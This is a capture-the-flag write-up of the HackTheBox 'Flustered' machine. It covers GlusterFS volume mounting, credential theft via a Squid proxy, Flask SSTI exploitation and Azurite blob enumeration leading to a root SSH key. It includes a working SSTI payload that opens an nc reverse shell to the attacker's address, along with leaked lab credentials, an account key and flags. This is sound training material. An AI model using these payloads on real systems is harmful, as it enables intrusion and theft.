### Summary 
Flustered was an easy machine from Hackthebox: Uni CTF Quals 2021. Starting by mounting a remote GlusterFS and extracting credentials within the volume. Using these credentials, Squid proxy can be acessed to access an internal web application that is vulnerable to SSTI. Once on the box, there is a Azurite docker container containing the root SSH key to get root access to the machine.

### Enumeration
An initial nmap shows quite a few ports open.

```
$ nmap -sV -sC -T4 -p- 10.129.209.174

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 93:31:fc:38:ff:2f:a7:fd:89:a3:48:bf:ed:6b:97:cb (RSA)
|   256 e5:f8:27:4c:38:40:59:e0:56:e7:39:98:6b:86:d7:3a (ECDSA)
|_  256 62:6d:ab:81:fc:d2:f7:a1:c1:9d:39:cc:f2:7a:a1:6a (ED25519)
80/tcp    open  http       nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: steampunk-era.htb - Coming Soon
111/tcp   open  rpcbind    2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
3128/tcp  open  http-proxy Squid http proxy 4.6
|_http-server-header: squid/4.6
|_http-title: ERROR: The requested URL could not be retrieved
24007/tcp open  rpcbind
49152/tcp open  rpcbind
49153/tcp open  rpcbind
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
There are some hostnames present from the nmap, `steampunk-era.htb` and `flustered.htb` given that `steampunk-era.htb` states *"coming soon"*, it's possible that this will be of no use; however I will add it to my `/etc/hosts` file anyway.

Going to the website hosted on port 80, it seems to just be a default page:

![default.png](https://i.imgur.com/fY9tm5G.png)

and doesn't have much to it:

![steampunk.png](https://i.imgur.com/DrJGsd8.png)

Background scanning can be done whilst the other ports are looked at. `flustered.htb` also points to this page.

Attempting to view pages or enumerate for other ports using Squid proxy does not work - this is likely because it requires credentials.

### Glusterfs

When googling for the port `24007`, a [RedHat documentation](https://access.redhat.com/documentation/en-us/red_hat_gluster_storage/3.3/html/container-native_storage_for_openshift_container_platform/crs_port_access) suggests that GlusterFS is running on the machine and the ports nmap identified as `rpcbind` are used by GlusterFS.

To interact with it, GlusterFS client can be installed with `sudo apt install glusterfs-server`. We attempted installing just `glusterfs-client`, but had issues with connections failing without the server package. Listing the volumes on the box:

```
$ sudo gluster --remote-host=flustered.htb volume list
vol1
vol2
```

The details of the volumes can also be listed with `sudo gluster --remote-host=flustered.htb volume info` returning:

```
$ sudo gluster --remote-host=flustered.htb volume info    
 
Volume Name: vol1
Type: Distribute
Volume ID: 0870acf0-d619-4cda-b273-4486062cff24
Status: Started
Snapshot Count: 0
Number of Bricks: 1
Transport-type: tcp
Bricks:
Brick1: flustered:/gluster/bricks/brick1/vol1
Options Reconfigured:
storage.fips-mode-rchecksum: on
transport.address-family: inet
nfs.disable: on
auth.ssl-allow: flustered.htb,web01.htb
client.ssl: off
server.ssl: off
 
Volume Name: vol2
Type: Distribute
Volume ID: 4e220cb2-9e33-4566-8181-d81ff0ac6980
Status: Started
Snapshot Count: 0
Number of Bricks: 1
Transport-type: tcp
Bricks:
Brick1: flustered:/gluster/bricks/brick1/vol2
Options Reconfigured:
features.read-only: enable
auth.ssl-allow: off
server.ssl: off
client.ssl: off
auth.allow: *
storage.fips-mode-rchecksum: on
transport.address-family: inet
nfs.disable: on
```

As seen above, `vol1` has `auth.ssl-allow: flustered.htb,web01.htb` meaning that authentication from `flustered.htb` or `web01.htb` is required. Whereas `vol2` states: `auth.allow: *` meaning that `vol2` is exposed with no restrictions.

This volume can be mounted as follows:

```
$ mkdir vol2
$ sudo mount -t glusterfs flustered.htb:/vol2 ./vol2
$ sudo ls ./vol2
aria_log.00000001  debian-10.3.flag  ibdata1	  ib_logfile1  multi-master.info  mysql_upgrade_info  squid
aria_log_control   ib_buffer_pool    ib_logfile0  ibtmp1       mysql		  performance_schema  tc.log
```

This appears to be a `mysql` directory. This can be copied into `/var/lib` and used like it was my database. Doing so:

![initialdatabase.png](https://i.imgur.com/dnY5pBt.png)

![password.png](https://i.imgur.com/zsSFzL3.png)

Evidently, these credentials might work for the squid proxy identified previously. Proxying my browser through the squid proxy with these credentials gives the default nginx page:

![defnginx.png](https://i.imgur.com/anfOvU6.png)

I configured proxychains with the following configuration inside `/etc/proxychains4.conf`:

```yaml
strict_chain

[ProxyList]
http 10.129.96.25 3128 lance.friedman o>WJ5-jD<5^m3
```

### steampunk-era.htb - SSTI to RCE
I can route automated fuzzing tools through squid proxy to enumerate the web application. This can take a while but amoung the results are:

![webscan.png](https://i.imgur.com/NCQK09j.png)

`app.py` details:

```python
from flask import Flask, render_template_string, url_for, json, request
app = Flask(__name__)

def getsiteurl(config):
  if config and "siteurl" in config:
    return config["siteurl"]
  else:
    return "steampunk-era.htb"

@app.route("/", methods=['GET', 'POST'])
def index_page():
  # Will replace this with a proper file when the site is ready
  config = request.json

  template = f'''
    <html>
    <head>
    <title>{getsiteurl(config)} - Coming Soon</title>
    </head>
    <body style="background-image: url('{url_for('static', filename='steampunk-3006650_1280.webp')}');background-size: 100%;background-repeat: no-repeat;"> 
    </body>
    </html>
  '''
  return render_template_string(template)

if __name__ == "__main__":
  app.run()

```

As seen, this is the configuration of the previously seen website. If there is no `config` specified in the client post request, `steampunk-era.htb` will be used (as seen before). Also, the picture will be set as an asset from the static subdirectory. 

Since this accepts user input and is being rendered with render_template_string, the code is vulnerable to [SSTI](https://portswigger.net/web-security/server-side-template-injection). If a request is sent with payload in the json, it should be executed in the template.

The general idea can be seen with the existing `config.json`:

```json
{
  "sitename": "steampunk-era.htb"
}
```

So the sitename is shown in the coming soon title. To test this, I can run the code on my own machine and debug. If the payload is:

```json
{
  "sitename": "anything",
  "siteurl":"{{7*7}}"
}
```
Assuming the rest of the http request is correct (likely have to change content-type to `application/json`), this returns:
```html
<title>49 - Coming Soon</title>
```

So the SSTI works. Using a reverse shell payload (I initially used `/bin/bash` but had errors which `sh` seemed to solve):

```python
{{ request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('nc 10.10.14.2 9919 -e /bin/sh')['read']() }}
```

### www-data to jennifer
I can get a shell as `www-data`. After lots more enumeration, and remembering the previous `volume info` of glusterfs, it's apparent that keys in `/etc/ssl` can be listed:

![keys.png](https://i.imgur.com/1xgbAZG.png)

After downloading these and putting them in my `/etc/ssl` directory, I should be able to mount the first glusterfs volume by doing `sudo mount -t glusterfs flustered:/vol1 ./vol1`. 

Once the directory is mounted, we get access to `jennifer`'s home directory. From there, we can insert our own SSH public key into her `authorized_keys` file. Once we've done this, we can SSH into the machine as `jennifer`.

(Note: As we were experiencing issues with being able to mount the directory due to the certificate expiring, we had to login with root's SSH key and do `su jennifer`. We also couldn't access /home/jennifer due to: `cd: /home/jennifer: Too many levels of symbolic links`, so we're working from the `/gluster/bricks/brick1/vol1/jennifer/` directory.)

Once we've SSH'd, we can get the user flag:
```
jennifer@flustered:/gluster/bricks/brick1/vol1/jennifer$ cat user.txt
HTB{m0v1Ng_tHr0ugH_v0lUm3s_l1K3_a_jInj4}
```

### Jennifer to Root
A quick view of `ip a` tells us that Docker is running on this machine:

```
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:a9:09:2e:03 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:a9ff:fe09:2e03/64 scope link 
       valid_lft forever preferred_lft forever
```

We can also see that inside `/var/backups`, there is a key accessible by `jennifer`:

```
jennifer@flustered:/gluster/bricks/brick1/vol1/jennifer$ ls -lah /var/backups/key
-rw-r----- 2 root jennifer 89 Oct 26 12:12 /var/backups/key
```

We can upload a static `nmap` and enumerate the Docker network.

```
./nmap 172.17.0.0/28

Nmap scan report for 172.17.0.2
Host is up (0.00020s latency).
Not shown: 1206 closed ports
PORT      STATE SERVICE
10000/tcp open  webmin
```

This reveals a single container which has port 10000 open. If we attempt to netcat to it, we get a warning about 400 Bad Request, indicating this is a HTTP server:

```
jennifer@flustered:/gluster/bricks/brick1/vol1/jennifer$ nc 172.17.0.2 10000
test
HTTP/1.1 400 Bad Request
Connection: close
```

```
curl -v http://172.17.0.2:10000/
* Expire in 0 ms for 6 (transfer 0x5644c0df3fb0)
*   Trying 172.17.0.2...
* TCP_NODELAY set
* Expire in 200 ms for 4 (transfer 0x5644c0df3fb0)
* Connected to 172.17.0.2 (172.17.0.2) port 10000 (#0)
> GET / HTTP/1.1
> Host: 172.17.0.2:10000
> User-Agent: curl/7.64.0
> Accept: */*
> 
< HTTP/1.1 400 Value for one of the query parameters specified in the request URI is invalid.
< Server: Azurite-Blob/3.14.3
< x-ms-error-code: InvalidQueryParameterValue
< x-ms-request-id: f4507e0b-43ed-4cc5-b273-816593bc6a92
< content-type: application/xml
< Date: Thu, 25 Nov 2021 14:38:28 GMT
< Connection: keep-alive
< Keep-Alive: timeout=5
< Transfer-Encoding: chunked
< 
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Error>
  <Code>InvalidQueryParameterValue</Code>
  <Message>Value for one of the query parameters specified in the request URI is invalid.
RequestId:f4507e0b-43ed-4cc5-b273-816593bc6a92
Time:2021-11-25T14:38:28.694Z</Message>
* Connection #0 to host 172.17.0.2 left intact
</Error>
```

The `Server` header reveals that this is a self-hosted Azurite emulator, used for local Azure Storage development. We can port forward port 10000 to our local machine using SSH:

```ssh jennifer@flustered.htb -L 10000:172.17.0.2:10000```

### Azurite
We can now access this service from our own machine. We can use the following script to enumerate the service and download files (requires `pip install azure-blob-storage`). The connection string is from the [Azurite GitHub](https://github.com/Azure/Azurite#default-storage-account) and specifies the AccountKey found in `/var/backups/key`:

```python
from azure.storage.blob import BlobServiceClient, BlobClient, ContainerClient, __version__

connect_str = 'DefaultEndpointsProtocol=http;AccountName=jennifer;AccountKey=FMinPqwWMtEmmPt2ZJGaU5MVXbKBtaFyqP0Zjohpoh39Bd5Q8vQUjztVfFphk73+I+HCUvNY23lUabd7Fm8zgQ==;BlobEndpoint=http://127.0.0.1:10000/jennifer;QueueEndpoint=http://127.0.0.1:10001/jennifer;TableEndpoint=http://127.0.0.1:10002/jennifer;'

try:
    blob_service_client = BlobServiceClient.from_connection_string(connect_str)

    # Listing containers and files in them
    for container in blob_service_client.list_containers():
        print(container['name'])
        container_client = blob_service_client.get_container_client(container['name'])
        blob_list = container_client.list_blobs()
        for blob in blob_list:
            print("\t" + blob.name)

except Exception as ex:
    print('Exception:')
    print(ex)

```

This tells us there is a container named `ssh-keys`, with a `root.key` in:

```
documents
ssh-keys
	jennifer.key
	root.key
```

We can then download this with the following script:
```python
from azure.storage.blob import BlobServiceClient, BlobClient, ContainerClient, __version__

connect_str = 'DefaultEndpointsProtocol=http;AccountName=jennifer;AccountKey=FMinPqwWMtEmmPt2ZJGaU5MVXbKBtaFyqP0Zjohpoh39Bd5Q8vQUjztVfFphk73+I+HCUvNY23lUabd7Fm8zgQ==;BlobEndpoint=http://127.0.0.1:10000/jennifer;QueueEndpoint=http://127.0.0.1:10001/jennifer;TableEndpoint=http://127.0.0.1:10002/jennifer;'

try:
    blob_service_client = BlobServiceClient.from_connection_string(connect_str)

    # Download the root key blob
    blob_client = blob_service_client.get_blob_client(container='ssh-keys', blob='root.key')
    with open('./root.key', "wb") as download_file:
        download_file.write(blob_client.download_blob().readall())

except Exception as ex:
    print('Exception:')
    print(ex)

```

Viewing the key confirms that it is an SSH key for root:

```
$ head root.key 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAvrfifWpWEAtxdHG7wTIqLGYPJo3TJ/+HzrrYHyzDBADpNEl2U+vi
NYW2N69F6n0Yjd7XZox69xb4AG0FOe6/SEXi+e960L023luJ7UUaJUxravi4BqAPabiZ5Q
```

### Keys to the Kingdom
Finally, we can login as root with SSH:

```
$ ssh -i root.key root@flustered.htb
Linux flustered 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Nov 25 14:40:58 2021 from 10.10.14.156
root@flustered:~# cat root.txt
HTB{s3creTs_fr0m_th3_sT0r4g3_bl0b}
root@flustered:~# 
```

We can get the root flag from root.txt: `HTB{s3creTs_fr0m_th3_sT0r4g3_bl0b}`
